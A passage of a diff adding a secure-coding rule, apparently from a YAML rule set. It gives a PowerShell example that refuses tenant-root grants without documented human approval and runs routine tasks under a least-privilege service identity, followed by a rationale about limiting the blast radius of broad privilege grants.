+    if ($resourceId -eq '/' -or $scope -eq '.default') {
+        throw 'Tenant-root grant requires documented human approval; refusing.'
+    }
+
+    # Routine tasks run as a dedicated least-privilege service identity
+    $cred = Get-Secret -Name 'svc-webfarm-operator' -Vault 'OpsVault'
+    Invoke-Command -ComputerName 'web01' -Credential $cred -ScriptBlock {
+        Restart-WebAppPool -Name 'W3SVC'
+    }
+  rationale: Broad standing grants convert any compromise of the granted identity into tenant- or domain-wide
+    compromise, while domain-admin reuse makes every routine operation a potential privilege-escalation
+    vector; narrow named-scoped grants cap the blast radius.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - authorization
+detection_rule_count: 36
